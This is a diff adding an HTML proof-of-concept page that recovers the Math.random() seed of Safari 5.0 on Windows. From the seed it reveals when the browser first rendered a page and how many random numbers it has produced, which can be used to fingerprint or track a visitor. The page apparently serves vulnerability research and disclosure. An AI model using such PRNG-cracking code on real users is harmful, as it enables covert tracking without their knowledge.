@@ -1,0 +1,47 @@
+<html>
+<body>
+<script>
+document.write("userAgent: "+navigator.userAgent);
+</script>
+<br>
+<br>
+<div id="foo"></div>
+<form>
+<input type="button"
+      value="Calculate Safari 5.0 (Windows) PRNG seed and mileage"
+      onClick="calc_seed()">
+</form>
+<script>
+function calc_seed()
+{
+      r1=Math.random()*Math.pow(2,32);
+      r2=Math.random()*Math.pow(2,32);
+      H=r1;
+      L=(r2-(((H & 0xFFFF0000)>>>16) | ((H & 0x0000FFFF)<<16)))
+            & 0xFFFFFFFF;
+      // 10000 is just an arbitrary limit to make sure the
+      // algorithm doesn't run into an endless loop on
+      // non-vulnerable browsers
+      for (k=0;k<10000;k++)
+      {
+            L=(L-H) & 0xFFFFFFFF;
+            H=(H-L) & 0xFFFFFFFF;
+            H=((H & 0xFFFF0000)>>>16) | ((H & 0x0000FFFF)<<16);
+            if ((H^L)==0x49616E42)
+            {
+                  document.getElementById("foo").innerText=
+                        "PRNG Seed: "+H+" "+
+                        "(First page rendered: "+
+                              (new Date(H*1000)).toString()+")\n"+
+                        "PRNG mileage: "+k;
+                  return;
+            }
+      }
+      document.getElementById("foo").innerText=
+            "Could not find seed\n"+
+            "Are you sure it's Safari 5.0 for Windows?";
+      return;
+}
+</script>
+</body>
+</html>
